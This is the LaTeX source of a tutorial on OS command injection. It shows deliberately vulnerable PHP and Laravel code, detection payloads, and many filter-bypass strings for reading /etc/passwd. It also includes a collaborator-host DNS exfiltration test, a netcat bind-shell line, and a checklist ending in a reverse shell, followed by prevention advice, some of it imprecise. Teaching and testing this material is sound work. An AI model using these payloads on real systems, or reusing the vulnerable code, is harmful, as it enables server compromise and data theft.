\documentclass[12pt]{article}

\usepackage[a4paper,margin=0.5in]{geometry}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{tcolorbox}
\usepackage{longtable}
\usepackage{multicol}
\usepackage{booktabs}
\usepackage{amssymb}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\definecolor{infoboxcolor}{rgb}{0.9,0.95,1}
\definecolor{warningcolor}{rgb}{1,0.95,0.9}
\definecolor{criticalcolor}{rgb}{1,0.9,0.9}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\small,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}

\lstset{style=mystyle}

% Custom boxes
\newtcolorbox{infobox}[1][]{colback=infoboxcolor,colframe=blue!50!black,title=#1,boxrule=1pt}
\newtcolorbox{warningbox}[1][]{colback=warningcolor,colframe=orange!50!black,title=#1,boxrule=1pt}
\newtcolorbox{criticalbox}[1][]{colback=criticalcolor,colframe=red!50!black,title=#1,boxrule=1pt}

\title{OS Command Injection Complete Guide}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage

% ==================================================
\section{What is OS Command Injection}

\subsection{Definition}

OS command injection (also known as shell injection) is a vulnerability that allows an attacker to execute operating system (OS) commands on the server running an application. This typically leads to full compromise of the application and its data.

\subsection{Impact}

An attacker can leverage OS command injection to:

\begin{itemize}
    \item Execute arbitrary commands on the server
    \item Read, write, and delete sensitive files
    \item Compromise other parts of the hosting infrastructure
    \item Use trust relationships to pivot to other systems
    \item Install backdoors and malware
    \item Completely take over the server
\end{itemize}

\subsection{How It Works}

When an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell, command injection can occur.

\begin{infobox}[Core Concept]
The application constructs a system command using user input without proper validation or sanitization. The attacker injects shell metacharacters to modify the command's behavior.
\end{infobox}

\subsection{Example Scenario}

Consider a shopping application that lets users view whether an item is in stock:

\begin{lstlisting}
https://insecure-website.com/stockStatus?productID=381&storeID=29
\end{lstlisting}

The application calls a shell command:
\begin{lstlisting}[language=bash]
stockreport.pl 381 29
\end{lstlisting}

An attacker submits:
\begin{lstlisting}
https://insecure-website.com/stockStatus?productID=381&echo+injected&storeID=29
\end{lstlisting}

The executed command becomes:
\begin{lstlisting}[language=bash]
stockreport.pl & echo injected & 29
\end{lstlisting}

% ==================================================
\section{Where to Find OS Command Injection}

\subsection{Common Locations}

\begin{itemize}
    \item Ping or network diagnostic tools
    \item File upload/download functionality
    \item Email sending features
    \item System monitoring interfaces
    \item Backup and restore functions
    \item Log viewing/exporting features
    \item Archive extraction (zip, tar, etc.)
    \item PDF generation from templates
    \item Image processing (converting, resizing)
    \item DNS lookup tools
\end{itemize}

\subsection{Common Parameter Names}

\begin{multicols}{3}
\begin{itemize}
    \item ping
    \item host
    \item ip
    \item address
    \item domain
    \item url
    \item file
    \item path
    \item cmd
    \item command
    \item exec
    \item system
    \item shell
    \item output
    \item log
    \item backup
    \item restore
\end{itemize}
\end{multicols}

% ==================================================
\section{Vulnerable Code Examples}

\subsection{PHP Command Injection}

\begin{lstlisting}[language=PHP, caption=Vulnerable PHP Code]
<?php
// Example 1: Direct system call with user input
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

// Example 2: Using exec
$file = $_GET['file'];
exec("cat " . $file, $output);
print_r($output);

// Example 3: Using shell_exec
$domain = $_GET['domain'];
$result = shell_exec("nslookup " . $domain);
echo $result;

// Example 4: Using passthru
$cmd = $_GET['cmd'];
passthru($cmd);

// Example 5: Using backticks
$host = $_GET['host'];
$output = `ping -c 4 $host`;
echo $output;
?>
\end{lstlisting}

\subsection{Laravel Command Injection}

\begin{lstlisting}[language=PHP, caption=Vulnerable Laravel Code]
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Process;

class DiagnosticController extends Controller
{
    // Vulnerable: Direct command execution
    public function ping(Request $request)
    {
        $ip = $request->input('ip');
        // Dangerous: User input directly in command
        $output = shell_exec("ping -c 4 " . $ip);
        return view('ping', ['output' => $output]);
    }
    
    // Vulnerable: Using Process facade
    public function scan(Request $request)
    {
        $host = $request->input('host');
        // Dangerous: No input validation
        $process = Process::run("nmap -sP " . $host);
        return $process->output();
    }
    
    // Vulnerable: Artisan command execution
    public function backup(Request $request)
    {
        $db = $request->input('database');
        // Dangerous: Command injection via custom Artisan command
        \Artisan::call("db:backup --database={$db}");
        return "Backup completed";
    }
}
?>
\end{lstlisting}

\subsection{Attack Example}

\begin{lstlisting}
# Normal request
GET /ping.php?ip=8.8.8.8 HTTP/1.1

# Malicious request
GET /ping.php?ip=8.8.8.8;%20cat%20/etc/passwd HTTP/1.1

# The executed command becomes:
ping -c 4 8.8.8.8; cat /etc/passwd
\end{lstlisting}

% ==================================================
\section{Detection of OS Command Injection}

\subsection{Basic Detection Payloads}

\begin{lstlisting}[language=bash]
# Simple echo test (in-band)
; echo test
| echo test
|| echo test
& echo test
&& echo test

# Time delay test (blind)
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5

# DNS exfiltration test (blind)
; nslookup test.collaborator.com
| nslookup test.collaborator.com
\end{lstlisting}

\subsection{Command Separators}

\begin{longtable}{|l|l|l|}
\hline
\textbf{Separator} & \textbf{Description} & \textbf{Example} \\
\hline
; & Execute sequentially & \verb|cmd1; cmd2| \\
\hline
\& & Execute in background & \verb|cmd1 \& cmd2| \\
\hline
\&\& & Execute if previous succeeds & \verb|cmd1 \&\& cmd2| \\
\hline
$|$ & Pipe output & \verb|cmd1 | cmd2| \\
\hline
$||$ & Execute if previous fails & \verb|cmd1 || cmd2| \\
\hline
\textbackslash n & Newline & \verb|cmd1\ncmd2| \\
\hline
\end{longtable}

\subsection{Detection Steps}

\begin{enumerate}
    \item Identify input parameters
    \item Submit command separators (;, \&, |, etc.)
    \item Observe response for changes
    \item Test with benign commands (echo, ping, sleep)
    \item Check for time delays (blind injection)
    \item Monitor out-of-band interactions
\end{enumerate}

% ==================================================
\section{When to Search for Command Injection}

\subsection{Indicators}

Look for command injection when:

\begin{itemize}
    \item Application interacts with system commands
    \item Network diagnostic features (ping, traceroute, nslookup)
    \item File operations with user-supplied filenames
    \item Email functionality with user-controlled addresses
    \item Archive extraction with user-supplied archive names
    \item Log viewing/exporting features
    \item System monitoring interfaces
\end{itemize}

% ==================================================
\section{Filter Bypasses}

\subsection{Bypass Without Space}

\begin{longtable}{|p{5cm}|p{10cm}|}
\hline
\textbf{Technique} & \textbf{Example} \\
\hline
\verb|${IFS}| & \verb|cat${IFS}/etc/passwd| \\
\hline
\verb|$IFS| & \verb|cat$IFS/etc/passwd| \\
\hline
Brace expansion & \verb|{cat,/etc/passwd}| \\
\hline
Input redirection & \verb|cat</etc/passwd| \\
\hline
Tab character & \verb|cat%09/etc/passwd| \\
\hline
ANSI-C quoting & \verb|X=$'uname\x20-a' \&\& $X| \\
\hline
Windows substring & \verb|ping%CommonProgramFiles:~10,-18%127.0.0.1| \\
\hline
\end{longtable}

\subsection{Bypass With A Line Return}

\begin{lstlisting}[language=bash]
# Commands can be run in sequence with newlines
original_cmd_by_server
ls
whoami
\end{lstlisting}

\subsection{Bypass With Backslash Newline}

\begin{lstlisting}[language=bash]
# Commands broken into parts using backslash + newline
$ cat /et\
c/pa\
sswd

# URL encoded form
cat%20/et%5C%0Ac/pa%5C%0Asswd
\end{lstlisting}

\subsection{Bypass With Tilde Expansion}

\begin{lstlisting}[language=bash]
echo ~+      # Current directory
echo ~-      # Previous directory
cd ~         # Home directory
\end{lstlisting}

\subsection{Bypass With Brace Expansion}

\begin{lstlisting}[language=bash]
{,ls,-la}
{,ifconfig}
{,ifconfig,eth0}
{,/usr/bin/id}
{cat,/etc/passwd}
\end{lstlisting}

\subsection{Bypass Characters Filter}

\begin{lstlisting}[language=bash]
# Generate slash using HOME variable
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

# Using tr to generate slash
swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
\end{lstlisting}

\subsection{Bypass Characters Filter Via Hex Encoding}

\begin{lstlisting}[language=bash]
# Using echo -e
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

# Using variable
swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

# Using xxd
swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
\end{lstlisting}

\subsection{Bypass With Single Quote}

\begin{lstlisting}[language=bash]
w'h'o'am'i
wh''oami
'w'hoami
whoa'm'i
\end{lstlisting}

\subsection{Bypass With Double Quote}

\begin{lstlisting}[language=bash]
w"h"o"am"i
wh""oami
"wh"oami
who"am"i
\end{lstlisting}

\subsection{Bypass With Backticks}

\begin{lstlisting}[language=bash]
wh``oami
who`echo am`i
`echo whoami`
\end{lstlisting}

\subsection{Bypass With Backslash and Slash}

\begin{lstlisting}[language=bash]
w\ho\am\i
/\b\i\n/////s\h
c\a\t /e\t\c\/p\a\s\s\w\d
\end{lstlisting}

\subsection{Bypass With \$@}

\begin{lstlisting}[language=bash]
who$@ami
who$*ami
echo whoami|$0
\end{lstlisting}

\subsection{Bypass With \$()}

\begin{lstlisting}[language=bash]
who$()ami
who$(echo am)i
who`echo am`i
$(echo whoami)
\end{lstlisting}

\subsection{Bypass With Variable Expansion}

\begin{lstlisting}[language=bash]
# Using wildcards
/???/??t /???/p??s??
/???/cat /???/passwd

# Using variable substitution
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
\end{lstlisting}

\subsection{Bypass With Wildcards}

\begin{lstlisting}[language=bash]
# Linux
/bin/cat /etc/passwd
/???/??t /???/p??s??
/???/cat /???/passwd

# Windows (PowerShell)
powershell C:\*\*2\n??e*d.*?    # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # calc
\end{lstlisting}

\subsection{Bypass With Random Case}

\begin{warningbox}[Windows Only]
Windows does not distinguish between uppercase and lowercase letters when interpreting commands or file paths.
\end{warningbox}

\begin{lstlisting}[language=sh]
wHoAmI
WHoami
whoAMI
cMd
cAlC
\end{lstlisting}

% ==================================================
\section{Data Exfiltration}

\subsection{Time Based Data Exfiltration}

Extract data character by character and detect correct values based on delay:

\begin{lstlisting}[language=bash]
# Check if first character of username is 's' (true - 5 second delay)
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s

# Check if first character of username is 'a' (false - no delay)
time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s

# Complete extraction script
for i in $(seq 1 20); do
    for c in {a..z}; do
        if [ $(whoami|cut -c $i) == $c ]; then
            echo "Character $i: $c"
            break
        fi
    done
done
\end{lstlisting}

\newpage
% ==================================================
\section{Polyglot Command Injection}

A polyglot is code that is valid and executable in multiple contexts simultaneously.

\subsection{Example 1}

\begin{lstlisting}[language=bash]
# Polyglot payload
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Works in different contexts:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
\end{lstlisting}

\subsection{Example 2}

\begin{lstlisting}[language=bash]
# Advanced polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

# Works in comments and quoted contexts
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
\end{lstlisting}

% ==================================================
\section{Tricks}

\subsection{Backgrounding Long Running Commands}

Sometimes long-running commands get killed when the parent process times out. Use \texttt{nohup} to keep processes running:

\begin{lstlisting}[language=bash]
# Keep process running after parent exits
nohup sleep 120 > /dev/null &
nohup python -m http.server 8080 > /dev/null &
nohup nc -lvp 4444 -e /bin/bash > /dev/null &
\end{lstlisting}

\subsection{Remove Arguments After Injection}

In Unix-like systems, \texttt{--} signifies the end of command options:

\begin{lstlisting}[language=bash]
# Original command
command -- user-input

# After injection
command -- --help
command -- ; whoami
command -- && id
\end{lstlisting}

% ==================================================
\section{Examples}

\subsection{Example 1: Simple Command Injection}

\begin{lstlisting}
GET /stockStatus?productID=381&echo+injected&storeID=29 HTTP/1.1
Host: vulnerable.com

# Response shows "injected" in output
Error - productID was not provided
injected
29: command not found
\end{lstlisting}

\subsection{Example 2: Blind Time Delay}

\begin{lstlisting}
POST /feedback HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

email=x||ping+-c+10+127.0.0.1||&message=test

# Response takes 10 seconds to return
\end{lstlisting}

\subsection{Example 3: Output Redirection}

\begin{lstlisting}[language=bash]
# Inject command that writes output to web root
& whoami > /var/www/static/whoami.txt &

# Retrieve the output
GET /whoami.txt HTTP/1.1
Host: vulnerable.com

Response: www-data
\end{lstlisting}


% ==================================================
\section{Methodology}

\subsection{Testing Workflow}

\begin{enumerate}
    \item \textbf{Identify input vectors}
    \begin{itemize}
        \item All parameters (GET, POST, cookies, headers)
        \item File uploads (filenames)
        \item API endpoints
    \end{itemize}
    
    \item \textbf{Test command separators}
    \begin{itemize}
        \item Submit \texttt{;}, \texttt{\&}, \texttt{|}, \texttt{||}, \texttt{\&\&}
        \item Observe error messages or behavior changes
    \end{itemize}
    
    \item \textbf{Test benign commands}
    \begin{itemize}
        \item \texttt{echo test123}
        \item \texttt{sleep 5} (time delay)
        \item \texttt{nslookup collaborator.com} (OOB)
    \end{itemize}
    
    \item \textbf{Extract information}
    \begin{itemize}
        \item In-band: Read command output directly
        \item Blind: Use time delays or DNS exfiltration
    \end{itemize}
    
    \item \textbf{Escalate privilege}
    \begin{itemize}
        \item Write web shells
        \item Create reverse shells
        \item Extract sensitive files
    \end{itemize}
\end{enumerate}

\subsection{Testing Checklist}

\begin{longtable}{|p{10cm}|p{3cm}|}
\hline
\textbf{Test} & \textbf{Status} \\
\hline
Identify all input parameters & $\square$ \\
\hline
Test command separators (;, \&, |) & $\square$ \\
\hline
Test echo payload for in-band detection & $\square$ \\
\hline
Test sleep payload for time delay & $\square$ \\
\hline
Test DNS exfiltration payload & $\square$ \\
\hline
Test output redirection to web root & $\square$ \\
\hline
Test space bypass techniques & $\square$ \\
\hline
Test character filter bypasses & $\square$ \\
\hline
Extract current username & $\square$ \\
\hline
Extract system information & $\square$ \\
\hline
Read sensitive files & $\square$ \\
\hline
Establish reverse shell & $\square$ \\
\hline
\end{longtable}

% ==================================================
\section{Prevention and Mitigation}

\subsection{Primary Prevention Strategies}

\begin{criticalbox}[The Golden Rule]
The most effective way to prevent OS command injection vulnerabilities is to \textbf{never call out to OS commands from application-layer code} when user input is involved.
\end{criticalbox}

\subsection{Use Safe APIs Instead}

\begin{lstlisting}[language=PHP]
// BAD: Calling system command
system("ping -c 4 " . $ip);

// GOOD: Use PHP's built-in functions
$socket = socket_create(AF_INET, SOCK_RAW, 1);
// or use filter_var with FILTER_VALIDATE_IP

// BAD: Using exec for file operations
exec("cat " . $filename);

// GOOD: Use PHP's file functions
$content = file_get_contents($filename);
\end{lstlisting}

\subsection{Input Validation (Whitelist)}

\begin{lstlisting}[language=PHP]
<?php
// Validate IP address format
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    system("ping -c 4 " . escapeshellcmd($ip));
} else {
    die("Invalid IP address");
}

// Validate alphanumeric input
if (ctype_alnum($username)) {
    system("finger " . escapeshellcmd($username));
} else {
    die("Invalid username");
}

// Whitelist allowed values
$allowed_commands = ['ping', 'traceroute', 'nslookup'];
if (in_array($command, $allowed_commands)) {
    system($command . " " . escapeshellarg($target));
}
?>
\end{lstlisting}

\subsection{Laravel Specific Prevention}

\begin{lstlisting}[language=PHP]
<?php
use Illuminate\Support\Facades\Process;
use Illuminate\Validation\Rule;

class DiagnosticController extends Controller
{
    public function ping(Request $request)
    {
        // Validate input
        $validated = $request->validate([
            'ip' => 'required|ipv4'
        ]);
        
        // Use escapeshellcmd for additional safety
        $ip = escapeshellcmd($validated['ip']);
        
        // Alternative: Use Process facade with array syntax (safer)
        $process = Process::run(['ping', '-c', '4', $ip]);
        
        return $process->output();
    }
    
    public function backup(Request $request)
    {
        // Use validation rule with whitelist
        $request->validate([
            'database' => ['required', Rule::in(['main', 'logs', 'cache'])]
        ]);
        
        // Now safe to use
        \Artisan::call("db:backup --database={$request->database}");
    }
}
?>
\end{lstlisting}

\subsection{Escaping Functions}

\begin{longtable}{|l|l|}
\hline
\textbf{Language} & \textbf{Escaping Function} \\
\hline
PHP & escapeshellarg(), escapeshellcmd() \\
\hline
Python & shlex.quote() \\
\hline
Java & ProcessBuilder (handles escaping automatically) \\
\hline
Node.js & execFile() instead of exec() \\
\hline
Ruby & Shellwords.escape() \\
\hline
\end{longtable}

\subsection{Use Parameterized Commands}

\begin{lstlisting}[language=python]
# Python - BAD
import os
os.system(f"ping -c 4 {user_input}")

# Python - GOOD (uses array to avoid shell interpretation)
import subprocess
subprocess.run(["ping", "-c", "4", user_input])

# Node.js - BAD
const { exec } = require('child_process');
exec(`ping -c 4 ${userInput}`);

# Node.js - GOOD
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput]);
\end{lstlisting}

\begin{infobox}[Key Takeaway]
The most effective prevention is to avoid calling OS commands altogether. When unavoidable:
\begin{enumerate}
    \item Whitelist allowed inputs
    \item Validate input format
    \item Use escapeshellarg()/escapeshellcmd()
    \item Run with least privilege
    \item Log suspicious attempts
\end{enumerate}
\end{infobox}

\begin{criticalbox}[Remember]
Never attempt to sanitize input by blacklisting dangerous characters. Attackers are creative and will find ways to bypass your filters. Always use whitelisting and proper escaping functions.
\end{criticalbox}

\end{document}